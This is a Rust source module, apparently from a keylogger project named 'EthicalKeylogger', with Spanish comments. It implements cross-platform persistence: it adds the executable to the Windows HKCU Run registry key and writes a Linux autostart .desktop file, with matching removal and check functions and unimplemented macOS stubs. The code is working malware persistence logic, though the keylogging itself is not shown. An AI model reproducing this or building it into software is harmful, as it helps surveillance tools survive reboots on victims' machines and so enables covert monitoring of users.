
// === WINDOWS IMPLEMENTATION ===
#[cfg(target_os = "windows")]
mod windows_impl {
    use std::fs;
    use std::path::PathBuf;
    use winreg::RegKey;
    use winreg::enums::*;

    pub fn instalar_persistencia() -> Result<(), Box<dyn std::error::Error>> {
        let exe_path = std::env::current_exe()?;
        let exe_path_str = exe_path.to_str().ok_or("Ruta inválida")?;

        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let (key, _) = hkcu.create_subkey(
            r"Software\Microsoft\Windows\CurrentVersion\Run"
        )?;

        key.set_value("EthicalKeylogger", &exe_path_str)?;

        println!("✅ Persistencia instalada en Windows (HKCU\\Run)");
        Ok(())
    }

    pub fn remover_persistencia() -> Result<(), Box<dyn std::error::Error>> {
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let (key, _) = hkcu.create_subkey(
            r"Software\Microsoft\Windows\CurrentVersion\Run"
        )?;

        key.delete_value("EthicalKeylogger")?;
        println!("✅ Persistencia removida de Windows");
        Ok(())
    }

    pub fn verificar_persistencia() -> bool {
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        if let Ok((key, _)) = hkcu.create_subkey(
            r"Software\Microsoft\Windows\CurrentVersion\Run"
        ) {
            if let Ok(_) = key.get_value::<String, _>("EthicalKeylogger") {
                return true;
            }
        }
        false
    }
}

// === LINUX IMPLEMENTATION ===
#[cfg(target_os = "linux")]
mod linux_impl {
    use std::fs;
    use std::os::unix::fs::PermissionsExt;
    use std::path::PathBuf;
    use std::env;

    pub fn instalar_persistencia() -> Result<(), Box<dyn std::error::Error>> {
        let exe_path = std::env::current_exe()?;
        let home = env::var("HOME")?;

        let autostart_dir = PathBuf::from(&home).join(".config/autostart");
        fs::create_dir_all(&autostart_dir)?;

        let desktop_file = autostart_dir.join("ethical-keylogger.desktop");
        let content = format!(
            r#"[Desktop Entry]
Type=Application
Name=Ethical Keylogger
Exec={}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"#,
            exe_path.display()
        );

        fs::write(&desktop_file, content)?;

        let mut perms = fs::metadata(&desktop_file)?.permissions();
        perms.set_mode(0o755);
        fs::set_permissions(&desktop_file, perms)?;

        println!("✅ Persistencia instalada en Linux (autostart)");
        Ok(())
    }

    pub fn remover_persistencia() -> Result<(), Box<dyn std::error::Error>> {
        let home = env::var("HOME")?;
        let desktop_file = PathBuf::from(&home)
            .join(".config/autostart/ethical-keylogger.desktop");

        if desktop_file.exists() {
            fs::remove_file(desktop_file)?;
            println!("✅ Persistencia removida de Linux");
        }
        Ok(())
    }

    pub fn verificar_persistencia() -> bool {
        let home = match env::var("HOME") {
            Ok(h) => h,
            Err(_) => return false,
        };
        let desktop_file = PathBuf::from(&home)
            .join(".config/autostart/ethical-keylogger.desktop");
        desktop_file.exists()
    }
}

// === MACOS IMPLEMENTATION ===
#[cfg(target_os = "macos")]
mod macos_impl {
    pub fn instalar_persistencia() -> Result<(), Box<dyn std::error::Error>> {
        println!("⚠️ Persistencia para macOS no implementada aún");
        Ok(())
    }

    pub fn remover_persistencia() -> Result<(), Box<dyn std::error::Error>> {
        println!("⚠️ Remover persistencia para macOS no implementada aún");
        Ok(())
    }

    pub fn verificar_persistencia() -> bool {
        false
    }
}

// === RE-EXPORT FUNCTIONS BASED ON OS ===
#[cfg(target_os = "windows")]
pub use windows_impl::*;

#[cfg(target_os = "linux")]
pub use linux_impl::*;

#[cfg(target_os = "macos")]
pub use macos_impl::*;
